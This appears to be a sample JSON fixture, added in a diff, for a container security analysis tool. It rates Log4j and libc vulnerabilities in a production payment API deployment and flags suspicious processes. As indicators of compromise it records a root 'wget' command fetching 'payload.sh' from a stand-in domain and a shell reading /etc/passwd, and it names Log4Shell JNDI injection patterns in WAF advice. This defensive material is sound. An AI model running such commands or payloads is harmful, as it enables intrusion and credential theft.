@@ -1,0 +1,147 @@
+{
+  "deploymentId": "sample-123",
+  "deploymentName": "payment-api",
+  "namespace": "production",
+  "clusterName": "prod-cluster-us-east",
+  "analysisTimestamp": "2026-04-09T21:00:00Z",
+  "originalRiskScore": 68.5,
+  "genAIPriority": 85,
+  "genAIPriorityExplanation": "HIGH priority due to CVE-2021-44228 (Log4Shell) being actively exploited in the wild according to CISA KEV. This deployment uses log4j-core 2.14.1 which is vulnerable. The service is publicly exposed on port 8080, meeting all exploitation prerequisites. Additionally, a suspicious wget process was detected attempting to download from an external source. Immediate action required to patch Log4j and investigate the wget process execution.",
+  "imageVulnerabilities": [
+    {
+      "cve": "CVE-2021-44228",
+      "cvss": 10.0,
+      "severity": "CRITICAL_VULNERABILITY_SEVERITY",
+      "component": "log4j-core",
+      "componentVersion": "2.14.1",
+      "fixedBy": "2.17.1",
+      "summary": "Apache Log4j2 2.0-beta9 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.",
+      "exploitMaturity": {
+        "maturityLevel": "HIGH",
+        "maturityScore": 55,
+        "isKnownExploited": true,
+        "hasMetasploitModule": false,
+        "hasPublicExploit": true,
+        "exploitSources": ["CISA KEV (Known Exploited)", "NVD References"],
+        "riskFactors": {
+          "weaponized": false,
+          "actively_exploited": true,
+          "poc_available": true,
+          "easy_to_exploit": false
+        },
+        "cisaKEV": {
+          "dateAdded": "2021-12-10",
+          "requiredAction": "For all affected software assets for which updates exist, the only acceptable remediation actions are: 1) Apply updates; OR 2) remove affected assets from agency networks.",
+          "dueDate": "2021-12-24",
+          "vulnerabilityName": "Apache Log4j2 Remote Code Execution Vulnerability"
+        }
+      },
+      "genAIUpdatedCVSS": 10.0,
+      "genAIMessage": "CRITICAL: This CVE is in CISA KEV (added 2021-12-10) and is actively exploited in the wild. Public PoC code is available. All prerequisites are met in this deployment (network accessible, no authentication required, Java application with Log4j). IMMEDIATE remediation required - update to log4j-core 2.17.1 or later."
+    },
+    {
+      "cve": "CVE-2022-23305",
+      "cvss": 9.8,
+      "severity": "CRITICAL_VULNERABILITY_SEVERITY",
+      "component": "log4j-core",
+      "componentVersion": "2.14.1",
+      "fixedBy": "2.17.1",
+      "summary": "By design, the JDBCAppender in Log4j 2.x uses a JNDI connection string",
+      "exploitMaturity": {
+        "maturityLevel": "MEDIUM",
+        "maturityScore": 25,
+        "isKnownExploited": false,
+        "hasMetasploitModule": false,
+        "hasPublicExploit": true,
+        "exploitSources": ["ExploitDB"],
+        "riskFactors": {
+          "weaponized": false,
+          "actively_exploited": false,
+          "poc_available": true,
+          "easy_to_exploit": false
+        }
+      },
+      "genAIUpdatedCVSS": 8.5,
+      "genAIMessage": "HIGH: Related to Log4j vulnerabilities. Public PoC available but not actively exploited according to CISA KEV. However, given the presence of CVE-2021-44228, this should be patched as part of the same remediation effort."
+    },
+    {
+      "cve": "CVE-2019-1010022",
+      "cvss": 9.8,
+      "severity": "LOW_VULNERABILITY_SEVERITY",
+      "component": "libc6",
+      "componentVersion": "2.41-12",
+      "fixedBy": "",
+      "summary": "GNU Libc current is affected by: Mitigation bypass.",
+      "exploitMaturity": {
+        "maturityLevel": "THEORETICAL",
+        "maturityScore": 0,
+        "isKnownExploited": false,
+        "hasMetasploitModule": false,
+        "hasPublicExploit": false,
+        "exploitSources": [],
+        "riskFactors": {
+          "weaponized": false,
+          "actively_exploited": false,
+          "poc_available": false,
+          "easy_to_exploit": false
+        }
+      },
+      "genAIUpdatedCVSS": 3.5,
+      "genAIMessage": "LOW: Despite CVSS 9.8, this CVE has no known exploits and upstream has marked it as 'non-security bug'. Requires local access which is not available in this deployment. Deprioritize in favor of CVE-2021-44228."
+    }
+  ],
+  "suspiciousProcessExecutions": [
+    {
+      "containerName": "payment-api",
+      "processName": "wget",
+      "processExecFilePath": "/usr/bin/wget",
+      "processArgs": "wget http://suspicious-domain.com/payload.sh",
+      "processUid": 0,
+      "timesExecuted": 1,
+      "suspicious": true,
+      "genAIClassification": "HIGH",
+      "genAIExplanation": "CRITICAL: wget process attempting to download from external domain (suspicious-domain.com). This is highly suspicious as wget should not be running in a production payment API container. Running as root (UID 0) increases the risk. This could be an indicator of compromise or a supply chain attack. Immediate investigation required to determine source of execution and whether payload was successfully downloaded or executed."
+    },
+    {
+      "containerName": "payment-api",
+      "processName": "/bin/sh",
+      "processExecFilePath": "/bin/sh",
+      "processArgs": "/bin/sh -c 'cat /etc/passwd'",
+      "processUid": 1000,
+      "timesExecuted": 2,
+      "suspicious": true,
+      "genAIClassification": "MEDIUM",
+      "genAIExplanation": "MEDIUM: Shell process reading /etc/passwd file. While reading /etc/passwd is not inherently malicious, it's unusual for a payment API to need this information. Running as non-root user (UID 1000) reduces risk. Could be legitimate debugging or could indicate reconnaissance activity. Recommend reviewing application logs to determine context."
+    },
+    {
+      "containerName": "payment-api",
+      "processName": "/app/payment-api",
+      "processExecFilePath": "/app/payment-api",
+      "processArgs": "/app/payment-api --config /etc/payment/config.yaml",
+      "processUid": 1000,
+      "timesExecuted": 1,
+      "suspicious": false,
+      "genAIClassification": "LOW",
+      "genAIExplanation": "LOW: Main application process. This is the expected payment API service running with appropriate configuration. Running as non-root user (UID 1000) is good security practice. No suspicious behavior detected."
+    }
+  ],
+  "exploitMaturitySummary": {
+    "totalChecked": 3,
+    "knownExploited": 1,
+    "hasMetasploit": 0,
+    "criticalMaturity": 0,
+    "highMaturity": 1
+  },
+  "recommendations": [
+    "URGENT: Update log4j-core to version 2.17.1 or later immediately to address CVE-2021-44228 (Log4Shell)",
+    "IMMEDIATE: Investigate wget process execution - check application logs for source of command and whether payload was downloaded",
+    "URGENT: Implement WAF rules to block Log4Shell exploitation attempts (${jndi:ldap://, ${jndi:rmi:// patterns)",
+    "Investigate shell process reading /etc/passwd - review application logs for context",
+    "Monitor network traffic for connections to suspicious-domain.com",
+    "Consider implementing network policies to restrict egress traffic from payment-api pod",
+    "Review container image build process to ensure wget was not intentionally included",
+    "Scan container image with updated vulnerability scanner after Log4j patch",
+    "Implement runtime monitoring to detect future suspicious process executions",
+    "Review and tighten security context - consider readOnlyRootFilesystem and drop capabilities"
+  ]
+}
